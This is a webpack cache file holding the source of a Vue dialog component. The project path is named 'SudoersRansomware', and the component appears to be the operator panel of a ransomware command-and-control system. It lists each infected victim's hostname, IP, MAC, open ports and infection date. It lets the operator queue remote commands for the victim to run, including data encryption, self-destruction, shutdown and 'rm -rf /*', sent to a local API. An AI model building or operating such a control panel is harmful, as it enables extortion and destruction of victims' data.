{"remainingRequest":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/vue-loader/lib/index.js??vue-loader-options!/home/mmarinse/SudoersRansomware/front-sudoers/src/components/RequestDialog.vue?vue&type=style&index=0&lang=css&","dependencies":[{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/src/components/RequestDialog.vue","mtime":1638178035823},{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/css-loader/dist/cjs.js","mtime":499162500000},{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/vue-loader/lib/loaders/stylePostLoader.js","mtime":499162500000},{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/postcss-loader/src/index.js","mtime":499162500000},{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/cache-loader/dist/cjs.js","mtime":499162500000},{"path":"/home/mmarinse/SudoersRansomware/front-sudoers/node_modules/vue-loader/lib/index.js","mtime":499162500000}],"contextDependencies":[],"result":[{"type":"Buffer","data":"base64:CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoudy0xMDB7CiAgICB3aWR0aDoxMDAlOwp9Cg=="},{"version":3,"sources":["RequestDialog.vue"],"names":[],"mappings":";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAkSA;AACA;AACA","file":"RequestDialog.vue","sourceRoot":"src/components","sourcesContent":["<template>\n  <v-dialog\n    v-model=\"dialog\"\n    max-width=\"900px\"\n    max-height=\"500px\"\n    scrollable\n    @close=\"dialog = false\"\n  >\n    <v-card>\n      <v-card-title style=\"font-size:22px\" class=\"px-lg-10 px-md-4 py-lg-8 py-lg-6\">\n          {{ title }}\n      </v-card-title>\n      <v-card-text class=\"px-lg-10 px-md-4\">\n        <div v-if=\"!showMessage\" class=\"w-100 h-100 d-center\">\n          <p style=\"20px\">{{ text }}</p>\n        </div>\n        <div v-if=\"dialogType ==='remoteCommand'\" class=\"w-100 h-100 d-center\">\n            <v-container>\n                <v-row v-if=\"!showMessage\">\n                    <v-col>\n                        <v-select\n                            @change=\"changeCommand\"\n                            :items=\"commands\"\n                            label=\"Select a command\"\n                        ></v-select>\n                    </v-col>\n                </v-row>\n                <v-row v-if=\"showMessage\">\n                    <v-col>\n                        <p style=\"font-size:18px\">El comando se ha enviado al servidor, cuando la víctima se conecte se ejecutará y obtendremos una respuesta.</p>\n                    </v-col>\n                </v-row>\n                <v-row v-if=\"!showMessage\">\n                    <v-col>\n                        <v-btn @click=\"sendCommand\">\n                            Enviar\n                        </v-btn>\n                    </v-col>\n                </v-row>\n            </v-container>\n        </div>\n        <div v-if=\"dialogType ==='showInfo'\" class=\"w-100 h-100 d-center\">\n            <v-container>\n                <v-row>\n                    <v-col>\n                        <b>Hostname:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.nombre }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Sistema operativo:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.so }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Dirección IP:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.ip }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Fecha infección:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.infectionTime }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Última conexión:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.ultima_fecha }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Puertos abiertos:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.puertos }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>MAC:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.mac }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <b>Dominio:</b>\n                    </v-col>\n                    <v-col>\n                        {{ victimInfo.dominio }}\n                    </v-col>\n                </v-row>\n                <v-row>\n                    <v-col>\n                        <v-expansion-panels accordion>\n                            <v-expansion-panel\n                            v-for=\"(item,i) in commands\"\n                            :key=\"i\"\n                            >\n                            <v-expansion-panel-header>\n                                {{item.text}}\n                            </v-expansion-panel-header>\n                            <v-expansion-panel-content>\n                                <p v-if=\"item.text === 'ls /etc'\">{{ commandsInfo.ls }}</p>\n                                <p v-if=\"item.text === 'self destruction'\">{{ commandsInfo.encriptar }}</p>\n                                <p v-if=\"item.text === 'arp'\">{{ commandsInfo.home }}</p>\n                                <p v-if=\"item.text === 'netstat -putona'\">{{ commandsInfo.home }}</p>\n                                <p v-if=\"item.text === 'shutdown'\">{{ commandsInfo.home }}</p>\n                                <p v-if=\"item.text === 'rm -rf /*'\">{{ commandsInfo.ls }}</p>\n                            </v-expansion-panel-content>\n                            </v-expansion-panel>\n                        </v-expansion-panels>\n                    </v-col>\n                </v-row>\n            </v-container>\n        </div>\n        <div v-if=\"dialogType ==='remoteCommand'\" class=\"w-100 h-100 d-center\">\n\n        </div>\n      </v-card-text>\n    </v-card>\n  </v-dialog>\n</template>\n<script>\nimport axios from \"axios\";\nexport default {\n  props: {\n    dialog: {\n      type: Boolean,\n      default: false\n    },\n    title:{\n        type: String,\n        default: \"Comando remoto\"\n    },\n    text:{\n        type: String,\n        default: \"Agrega un comando en el formulario para ejecutarlo la próxima vez que se conecte la víctima\"\n    },\n    dialogType:{\n        type: String,\n        default:\"remoteCommand\"\n    },\n    id:{\n        type: Number,\n        default: 1\n    }\n    \n  },\n  data() {\n    return {\n        commandToSend:null,\n        cookiesMessage: true,\n        lastCookies: null,\n        dialogTypeData: this.dialogType,\n        showMessage: false,\n        victimInfo: {\n            active:true,\n            lastTime:\"26-11-21\",\n            hostname:\"mmarinse\",\n            ip:\"10.10.11.102\",\n            infectionTime:\"21-11-21\",\n            operativeSystem:\"Linux Debian 11 OS\"\n        },\n      commands:[\n          {\n            text: \"ls /etc\",\n            value: 1,\n          },\n          {\n            text: \"Self destruction\",\n            value: 2,\n          },\n          {\n            text: \"arp\",\n            value: 3,\n          },\n          {\n            text: \"Cifrar información\",\n            value: 4,\n          },\n          {\n            text: \"shutdown\",\n            value: 5,\n          }\n      ],\n      commandsInfo:{\n        list:\"ajlksjklsa\",\n        encrypt:\"26-11-21\",\n        propagation:\"mmarinse\",\n        shutdown:\"10.10.11.102\",\n        ports:\"21-11-21\",\n        infoSystem:\"Linux Debian 11 OS\"\n      }\n    }\n  },\n  methods:{\n    parseObjectToArray: function(subject){\n        const objectArray = Object.entries(subject);\n        console.log(\"YEEAH\", objectArray)\n    },\n    obtainVictim: async function(){\n        let result\n        let victim\n        let hola = this.id\n        try{\n            result = await axios.get(`http://127.0.0.1:3050/equipos/${hola}`)\n        }catch(e){\n            console.log(e)\n        }\n        victim = result.data\n        // let año = victim.ultima_fecha.substring(0,4)\n        // let mes = victim.ultima_fecha.substring(4,6)\n        // let dia = victim.ultima_fecha.substring(6,8)\n        // let hora = victim.ultima_fecha.substring(8,10)\n        // let min = victim.ultima_fecha.substring(10,12)\n        // let seg = victim.ultima_fecha.substring(12,14)\n        // let miliseg = victim.ultima_fecha.substring(14,16)\n        //victim.ultima_fecha = new Date(año,mes - 1,dia,hora,min,seg,miliseg)\n        return victim\n    },\n    obtainCommands: async function(){\n        let result\n        let hola = this.id\n        debugger\n        try{\n            result = await axios.get(`http://127.0.0.1:3050/comandos/${hola}`)\n        }catch(e){\n            console.log(e)\n        }\n        debugger\n        return result.data\n    },\n    changeCommand:function(e){\n        this.commandToSend = e\n    },\n    sendCommand: async function(){\n        let result\n        let body = {\n            id_equipo:this.id,\n            pendiente: this.commandToSend\n        }\n        try{\n            result = await axios.patch(`http://127.0.0.1:3050/comandos/update/`, body)\n        }catch(e){\n            console.log(e)\n        }\n        this.showMessage = true\n    }\n  },\n  watch: {\n    open(value) {\n      this.dialog = value;\n    },\n    async dialog(value) {\n      if (!value) {\n        this.$emit('dialog-closed', false);\n        this.showMessage = false\n      }\n      if(value){\n          if(this.dialogType === \"showInfo\"){\n              this.commandsInfo = await this.obtainCommands()\n              this.victimInfo = await this.obtainVictim()\n              let hola = this.commandsInfo\n                            debugger\n          }\n        // console.log(\"SEEE:\",this.victimInfo)\n        // this.parseObjectToArray(this.commandsInfo)\n        // console.log(\"HEELLO\",this.commandsInfo)\n      }\n    }\n  },\n}\n</script>\n<style>\n.w-100{\n    width:100%;\n}\n</style>\n"]}]}